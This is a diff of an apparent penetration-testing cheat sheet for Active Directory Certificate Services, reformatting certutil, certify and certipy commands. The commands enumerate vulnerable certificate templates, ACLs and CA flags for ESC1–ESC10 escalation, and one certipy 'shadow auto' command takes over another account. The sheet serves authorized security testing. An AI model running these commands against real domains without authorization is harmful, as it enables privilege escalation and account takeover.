@@ -2,37 +2,37 @@
 
 ## 1) Get templates information
 
- - certutil -v -dsTemplate
+    certutil -v -dsTemplate
 
- - certify.exe find [/vulnerable]
+    certify.exe find [/vulnerable]
 
- - certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DC -vulnerable
+    certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DC -vulnerable
 
 ### If we find true positive results, we proceed to exploitation via ESC1 (Request a certificate from a vulnerable template), ESC2 and ESC3 (Use an enrollment agent to request a certificate) Techniques
 
 ## 2) Get ACL Information
 
- - certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DOMAIN_CONTROLLER
+    certipy find -u USER@DOMAIN -p PASSWORD -dc-ip DOMAIN_CONTROLLER
 
 ### If we find true positive results, we proceed to exploitation via ESC4 and ESC7 techniques
 
 ## 3) Display CA Information
 
- - certutil -TCAInfo
+    certutil -TCAInfo
 
- - certify.exe cas
+    certify.exe cas
 
 ## 4) Get PKI Objects Information
 
- - certify.exe pkiobjects
+    certify.exe pkiobjects
 
 ### If we find true positive results, we proceed to exploitation via ESC5 technique
 
 ## 5) Get CA Flags (if remote registry is enabled)
 
- - certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
+    certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 
- - certipy / certify.exe (only the flag ATTRIBUTESUBJECTALTNAME2)
+    certipy / certify.exe (only the flag ATTRIBUTESUBJECTALTNAME2)
 
 ### If we find true positive results, we proceed to exploitation via ESC6 technique
 
@@ -40,4 +40,4 @@
 
 # Misconfigured Certificate Mapping (blind test) (ESC9/ESC10)
 
- - certipy shadow auto -username ACCOUNT1@DOMAIN -p PASS1 -account ACCOUNT2
+    certipy shadow auto -username ACCOUNT1@DOMAIN -p PASS1 -account ACCOUNT2
